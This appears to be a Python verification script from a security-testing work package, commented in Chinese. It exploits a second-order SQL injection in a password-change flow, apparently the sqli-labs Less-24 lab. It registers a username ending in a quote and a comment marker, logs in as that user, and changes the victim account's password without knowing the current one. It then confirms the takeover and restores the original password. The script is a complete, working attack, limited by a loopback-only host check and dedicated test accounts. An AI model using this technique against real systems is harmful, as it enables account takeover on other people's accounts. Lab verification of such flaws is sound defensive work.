#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# SQLI-005 / final-wp4-v2 本地验证草案（未运行，需人工适配）
# 路径：注册 -> 登录 -> 改密 的第二阶 SQL 注入（SESSION.username 未转义进入 UPDATE）
import argparse
import http.cookiejar
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOSTS = {"127.0.0.1", "localhost", "::1"}
SUCCESS_TEXT = "Password successfully updated"
FAILED_MARK = "failed.php"
LOGIN_FAIL_IMG = "slap1.jpg"
CREATED_IMG = "Less-24-user-created.jpg"
CREATED_TEXT = "Redirecting you to login page in 5 sec"
USER_EXISTS = "The username Already exists"


class RefuseRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def check_target(url):
    parts = urllib.parse.urlsplit(url)
    if parts.scheme not in ("http", "https"):
        raise SystemExit("[!] 只接受 http/https 目标: %s" % url)
    host = (parts.hostname or "").lower()
    if host not in ALLOWED_HOSTS:
        raise SystemExit("[!] 默认只允许本机回环地址，拒绝: %s" % host)


def join(base, path):
    if not path.startswith("/"):
        path = "/" + path
    return base.rstrip("/") + path


def make_opener(session_file):
    if session_file:
        jar = http.cookiejar.LWPCookieJar(session_file)
        try:
            jar.load(ignore_discard=True, ignore_expires=True)
        except FileNotFoundError:
            pass
    else:
        jar = http.cookiejar.CookieJar()
    handler = urllib.request.HTTPCookieProcessor(jar)
    return urllib.request.build_opener(handler, RefuseRedirect), jar


def post(opener, url, fields, timeout):
    data = urllib.parse.urlencode(fields).encode("utf-8")
    req = urllib.request.Request(url, data=data, method="POST")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    req.add_header("User-Agent", "sqli005-wp4v2-draft/1.0")
    try:
        with opener.open(req, timeout=timeout) as resp:
            body = resp.read().decode("utf-8", "replace")
            return resp.status, body, resp.headers.get("Location")
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", "replace")
        return exc.code, body, exc.headers.get("Location")
    except urllib.error.URLError as exc:
        raise SystemExit("[!] 连接失败（环境问题，不是漏洞结论）: %s" % exc.reason)


def register(opener, url, user, pw, timeout):
    fields = {"submit": "1", "username": user, "password": pw, "re_password": pw}
    status, body, loc = post(opener, url, fields, timeout)
    created = (CREATED_IMG in body) or (CREATED_TEXT in body)
    exists = USER_EXISTS in body
    print("[register] user=%r status=%s created=%s exists=%s" % (user, status, created, exists))
    return created and not exists


def login(opener, url, user, pw, timeout):
    status, body, loc = post(opener, url, {"login_user": user, "login_password": pw}, timeout)
    fail_img = LOGIN_FAIL_IMG in body
    redirected = bool(loc) and ("logged-in.php" in loc)
    ok = redirected or not fail_img
    print("[login] user=%r status=%s location=%r login_fail_img=%s" % (user, status, loc, fail_img))
    return ok


def change(opener, url, current_pw, new_pw, timeout):
    fields = {"submit": "1", "current_password": current_pw,
              "password": new_pw, "re_password": new_pw}
    status, body, loc = post(opener, url, fields, timeout)
    success = SUCCESS_TEXT in body
    failed = (FAILED_MARK in body) or (bool(loc) and FAILED_MARK in loc)
    print("[change] status=%s success_text=%s failed=%s location=%r" % (status, success, failed, loc))
    return success, failed


def main():
    ap = argparse.ArgumentParser(description="SQLI-005 second-order SQLi draft (local lab only)")
    ap.add_argument("--base-url", default="http://127.0.0.1", help="靶场基址")
    ap.add_argument("--register-path", required=True, help="注册处理页路径（代码证据为 new_user.php）")
    ap.add_argument("--login-path", required=True, help="登录处理页路径（片段未给文件名，需验证人员填写）")
    ap.add_argument("--change-path", required=True, help="改密处理页路径（片段未给文件名，需验证人员填写）")
    ap.add_argument("--session-file", default=None, help="Cookie 会话文件（可选，勿提交版本库）")
    ap.add_argument("--victim", default="sqli005_victim", help="专用受害测试账号（禁止真实账号）")
    ap.add_argument("--orig-password", default="Orig!005Pw", help="专用账号原口令")
    ap.add_argument("--new-password", default="Changed!005Pw", help="注入改密后的新口令")
    ap.add_argument("--timeout", type=float, default=15.0)
    args = ap.parse_args()

    check_target(args.base_url)
    reg_url = join(args.base_url, args.register_path)
    login_url = join(args.base_url, args.login_path)
    change_url = join(args.base_url, args.change_path)
    for u in (reg_url, login_url, change_url):
        check_target(u)

    victim = args.victim
    control = args.victim + "_ctl"
    injected = victim + "'#"

    print("== 0) 写入三个专用测试账号（受害 + 基线 + 含单引号） ==")
    opener, jar = make_opener(args.session_file)
    if not register(opener, reg_url, victim, args.orig_password, args.timeout):
        raise SystemExit("[!] 前置失败：注册页不可用或参数名不匹配（不是漏洞结论）")
    if not register(opener, reg_url, control, args.orig_password, args.timeout):
        raise SystemExit("[!] 前置失败：基线账号未建立")
    if not register(opener, reg_url, injected, "Attacker!005Pw", args.timeout):
        raise SystemExit("[!] 前置失败：含单引号用户名被拒（可能存在本片段之外的过滤）")

    print("== 1) 基线：普通用户名 + 错误 current_password 应失败 ==")
    opener_c, _ = make_opener(None)
    if not login(opener_c, login_url, control, args.orig_password, args.timeout):
        raise SystemExit("[!] 前置失败：基线账号无法登录")
    c_success, c_failed = change(opener_c, change_url, "wrong-current-guess",
                                 args.new_password, args.timeout)
    baseline_denied = (not c_success) and c_failed
    print("[baseline] success_text=%s failed=%s denied=%s" % (c_success, c_failed, baseline_denied))

    print("== 2) 注入：以 victim 加单引号加 # 的账号登录，使 SESSION.username 取自数据库原值 ==")
    opener_i, _ = make_opener(None)
    if not login(opener_i, login_url, injected, "Attacker!005Pw", args.timeout):
        raise SystemExit("[!] 前置失败：注入账号未建立会话（不是注入结论）")

    print("== 3) 注入：错误 current_password 提交改密，观察 # 是否注释掉口令条件 ==")
    i_success, i_failed = change(opener_i, change_url, "wrong-current-guess",
                                 args.new_password, args.timeout)
    injected_success = i_success and not i_failed
    print("[inject] success_text=%s failed=%s injected_success=%s" % (i_success, i_failed, injected_success))

    print("== 4) 独立回查：新口令登录 victim 成功、原口令登录失败 ==")
    opener_new, _ = make_opener(None)
    new_ok = login(opener_new, login_url, victim, args.new_password, args.timeout)
    opener_old, _ = make_opener(None)
    old_ok = login(opener_old, login_url, victim, args.orig_password, args.timeout)
    verified = new_ok and (not old_ok)
    print("[verify] new_password_login=%s old_password_login=%s verified=%s" % (new_ok, old_ok, verified))

    print("== 5) 恢复：把 victim 口令改回原值并独立回查 ==")
    r_success, r_failed = change(opener_i, change_url, "wrong-current-guess",
                                 args.orig_password, args.timeout)
    opener_restore, _ = make_opener(None)
    restored = login(opener_restore, login_url, victim, args.orig_password, args.timeout)
    print("[restore] success_text=%s restored_login=%s" % (r_success, restored))

    if args.session_file:
        jar.save(ignore_discard=True, ignore_expires=True)
        print("[session] 会话写入 %s（Cookie 不打印，勿提交版本库）" % args.session_file)
    print("[cleanup] 定向删除三个专用测试行: %r / %r / %r" % (victim, control, injected))
    print("[summary] baseline_denied=%s injected_success=%s verified=%s restored=%s"
          % (baseline_denied, injected_success, verified, restored))
    if baseline_denied and injected_success and verified:
        print("RESULT: 观察到与第二阶 SQL 注入一致的业务结果，保存响应片段与截图后交工作包3核验")
    else:
        print("RESULT: 未观察到完整证据（观察不足，不得据此判定样本安全）")


if __name__ == "__main__":
    main()
